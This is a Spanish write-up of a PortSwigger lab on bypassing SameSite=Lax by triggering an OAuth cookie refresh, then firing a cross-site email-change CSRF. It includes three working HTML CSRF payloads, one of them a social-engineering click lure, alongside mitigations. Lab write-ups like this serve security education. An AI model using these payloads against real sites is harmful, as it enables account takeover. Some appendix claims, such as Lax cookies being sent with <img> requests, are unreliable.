
---

# Bypass de **SameSite Lax** mediante **refresco de cookie (OAuth)**

## 1. Introducción (con URL)

En este laboratorio, la funcionalidad de cambio de email es vulnerable a CSRF, pero la política de cookies SameSite por defecto en **modo Lax** impide que se usen cookies de sesión en **peticiones POST cross-site**.  
La aplicación soporta autenticación mediante OAuth y, durante este flujo, el servidor **refresca la cookie de sesión**, estableciendo una nueva cookie sin restricciones SameSite explícitas.

[Ver laboratorio Portswigger](https: //portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)

---

## 2. Contexto

SameSite Lax evita que el navegador envíe cookies en peticiones POST realizadas desde otra página, lo que normalmente bloquea CSRF.  
Sin embargo, el navegador **sí envía cookies en peticiones GET que activan una navegación top-level** y, además, la sesión puede ser renovada si la web fuerza al navegador a reautenticarse por OAuth.

La clave está en que el endpoint `/social-login` **dispara automáticamente el flujo OAuth** y, al finalizar, genera una **cookie de sesión nueva** que el navegador acepta y usa aunque la sesión estuviera activa.

Este refresco de sesión es lo que habilita el bypass.

---

## 3. Análisis de peticiones

### 3.1 Petición vulnerable

La acción de cambio de email:

```
POST /my-account/change-email
email=new@domain.com
```

No incluye:

- Tokens CSRF
    
- Nonces
    
- Validaciones de origen
    

Por tanto, si conseguimos que la cookie de sesión acompañe un POST cross-site, el ataque funciona.

### 3.2 OAuth y la cookie

Al finalizar el OAuth flow, el servidor responde a:

```
GET /oauth-callback?code=...
```

Y **establece una nueva cookie de sesión sin SameSite explícito**:

```
Set-Cookie: session=XYZ; Path=/; HttpOnly
```

El navegador aplicará SameSite=Lax, pero al ser reciente, durante ~2 minutos permite origen cruzado en POST.

---

## 4. Explotación

### 4.1 Ataque CSRF básico

El atacante construye un formulario auto-enviado:

```html
<script>
    history.pushState('', '', '/')
</script>
<form action="https://TARGET/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
</form>
<script>
    document.forms[0].submit();
</script>
```

**Resultado:**

- Si la cookie fue creada recientemente (<2 min), el navegador la envía, el ataque funciona.
    
- Si no, la cookie no se envía y el CSRF falla.
    

Esto revela que la “ventana de ejecución” depende del refresco de sesión.

---

## 5. Bypass de SameSite mediante refresco de cookie

### 5.1 Forzando al navegador a refrescar la sesión

Si enviamos al usuario a:

```
GET /social-login
```

Se inicia automáticamente el OAuth flow, que termina emitiendo **una cookie nueva**.

Esa nueva cookie es considerada:

- SameSite=Lax
    
- “Reciente”
    
- Elegible para uso en peticiones POST cross-site
    

Entonces, tras refrescar sesión, podemos lanzar el CSRF y funcionará.

---

## 6. Publicación y verificación

Un exploit funcional:

```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://TARGET/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

Funcionamiento:

1. Se abre `/social-login` → OAuth → cookie nueva
    
2. Esperamos 5 segundos
    
3. Se envía el POST que cambia el email
    
4. El navegador incluye la cookie nueva
    
5. CSRF exitoso
    

---

## 7. Fundamentación

### 7.1 Por qué SameSite falla aquí

- SameSite=Lax bloquea POST cross-site **solo si la cookie no es reciente**
    
- Tras OAuth, la cookie es reciente por definición
    
- Por ~2 minutos el navegador la envía en cross-site POST
    

### 7.2 Debilidad arquitectónica

El flujo OAuth:

1. Refresca la sesión aunque el usuario ya esté logueado
    
2. No usa estado adicional (CSRF tokens)
    
3. No marca SameSite=Strict o Secure
    
4. No restringe apertura desde ventanas externas
    

Esto abre la puerta a ataques basados en temporización.

---

## 8. Mitigaciones

Recomendaciones clave:

1. **Set-Cookie con atributos estrictos:**
    
    - `SameSite=Strict`
        
    - `Secure`
        
    - `HttpOnly`
        
2. **CSRF tokens en `/change-email`**
    
3. **Bloquear OAuth cerebrado**
    
    - No refrescar sesión si ya existe
        
    - Validar origen del flujo OAuth
        
4. **Verificar `Origin` y `Referer`**
    
5. **Bloquear auto-popup sin interacción**
    

---

## 9. Payload alternativo (versión interactiva)

Usar ingeniería social para abrir OAuth:

```html
<form method="POST" action="https://TARGET/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Haz clic para ver una imagen exclusiva</p>
<script>
    window.onclick = () => {
        window.open('https://TARGET/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

---

## 10. Conclusión

Este laboratorio muestra que **SameSite Lax no garantiza protección CSRF**, especialmente cuando la aplicación:

- Emite nuevas cookies sin atributos de seguridad
    
- Permite refrescar sesión vía OAuth sin controles adicionales
    
- Depende de temporización y flujo de login automático
    

El ataque depende únicamente de:

- Abrir una ventana a `/social-login`
    
- Esperar breve tiempo
    
- Enviar un POST cross-site
    

Esto demuestra que una mala gestión de sesiones y OAuth puede convertir SameSite en una defensa permeable.


---

# Para saber más sobre el tiempo de expiración de Cookie

## 1. Cookies tienen un tiempo de vida (TTL)

La cookie de sesión puede expirar por tiempo absoluto (mediante el atributo `Expires`), por duración establecida (mediante `Max-Age`) o por invalidación desde el servidor.

Cuando vemos `Max-Age=120`, significa que la cookie tendrá una vida útil de 120 segundos, es decir, dos minutos.

Un ejemplo típico sería:

```
Set-Cookie: session=abc; Max-Age=120; Expires=Mon, 20 Jan 2025 10:30:00 GMT; HttpOnly; Secure; SameSite=Lax
```

Esto indica que la cookie será válida hasta que transcurran los 120 segundos o hasta la fecha indicada en `Expires`, lo que ocurra antes.

---

## 2. Relación entre la fecha “Mon…” y SameSite

SameSite no depende directamente de la fecha de expiración, pero la expiración influye en el comportamiento de la cookie. Si una cookie expira, deja de enviarse en cualquier contexto, tanto same-site como cross-site. Además, si se genera una cookie nueva, puede tener políticas diferentes.

En el caso del laboratorio, se hace renovar la sesión mediante OAuth, se emite una cookie reciente con un tiempo de vida corto y, mientras la cookie exista, el navegador puede enviarla en determinados contextos. Cuando expira, deja de enviarse y el POST susceptible a CSRF deja de funcionar.

---

## 3. Cuando solo aparece Expires sin Max-Age

Un ejemplo sería:

```
Set-Cookie: cart_id=123; Expires=Mon, 15 Jan 2025 00:00:00 GMT; SameSite=Lax
```

En este caso, se establece un momento fijo de expiración. Si hoy es sábado y la fecha de expiración es el lunes, la cookie será válida durante los días que falten hasta ese momento. Por tanto, la ventana de validez puede ser horas o días, no necesariamente minutos.

---

## 4. Implicaciones de seguridad

Si una cookie tiene una fecha de expiración larga, se utiliza SameSite=Lax y no existe un mecanismo adicional de protección contra CSRF, podríamos explotar el sitio durante toda la vida útil de la cookie.

Un ejemplo sería:

```
Set-Cookie: session=abc; Expires=Mon, 27 Jan 2025 14:00:00 GMT; SameSite=Lax
```

En este caso, el navegador bloqueará el envío de la cookie en peticiones POST cross-site, pero seguirá enviándola en peticiones GET que generen navegación, como una etiqueta `<img>` o un enlace.

Esto puede dar lugar a situaciones como CSRF basado en GET, reenvío de sesión a servidores controlados por un atacante o escenarios de clickjacking.

---
